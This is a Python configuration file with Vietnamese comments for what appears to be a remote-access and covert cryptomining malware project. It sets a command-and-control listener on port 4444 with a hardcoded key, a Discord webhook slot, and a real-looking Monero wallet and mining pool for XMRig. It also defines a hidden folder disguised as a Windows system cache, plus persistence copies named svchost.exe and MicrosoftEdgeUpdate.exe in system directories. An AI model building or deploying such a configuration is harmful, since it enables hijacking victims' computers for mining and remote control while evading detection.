# core/config.py
import os

# ========== NETWORK CONFIGURATION ==========
# Địa chỉ IP của máy admin (client sẽ kết nối đến đây)
# Nếu chạy trên cùng máy, dùng '127.0.0.1'
# Nếu khác máy, thay bằng IP thực của admin (ví dụ '192.168.1.100')
ADMIN_IP = ''

# Cổng kết nối (phải mở trên firewall)
SERVER_PORT = 4444

# Khóa xác thực admin (phải giống nhau trên admin và client)
ADMIN_KEY = "1234567890"

# Địa chỉ lắng nghe của admin (0.0.0.0 để chấp nhận mọi kết nối)
SERVER_HOST = '0.0.0.0'

# ========== WEBHOOK DISCORD ==========
# Thay bằng webhook URL thật của bạn (nếu không dùng, để trống)
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

# ========== MINER CONFIGURATION ==========
# Ví Monero (Cake Wallet, Monero GUI, v.v.)
MINER_WALLET = "465X1JPbKUeW5gAGUbPPQ5FNZgJRALpcn6GP9MuUeF5xH7fnzWR32LPbNEajt2pfoGWhhY6mNpiDz6iLxReThezMN9Zxani"

# Pool đào Monero (supportxmr.com với TLS)
MINER_POOL = "pool.supportxmr.com:443"
MINER_POOL_TLS = True
MINER_ALGO = "rx/0"      # RandomX cho Monero

# ========== PATH & HIDDEN DIRECTORIES ==========
PROGRAMDATA = os.environ.get('PROGRAMDATA', os.environ['APPDATA'])
HIDDEN_DIR = os.path.join(PROGRAMDATA, 'Microsoft', 'Windows', 'Caches', 'SystemUpdate')
MINER_DIR = os.path.join(HIDDEN_DIR, 'XMRig')
STATE_FILE = os.path.join(HIDDEN_DIR, 'state.dat')

# ========== BACKUP PATHS (Persistence) ==========
BACKUP_PATHS = [
    os.path.join(HIDDEN_DIR, 'svchost.exe'),
    os.path.join(os.environ['WINDIR'], 'System32', 'Tasks', 'MicrosoftEdgeUpdate.exe'),
    os.path.join(os.environ['WINDIR'], 'Temp', 'svchost.exe')
]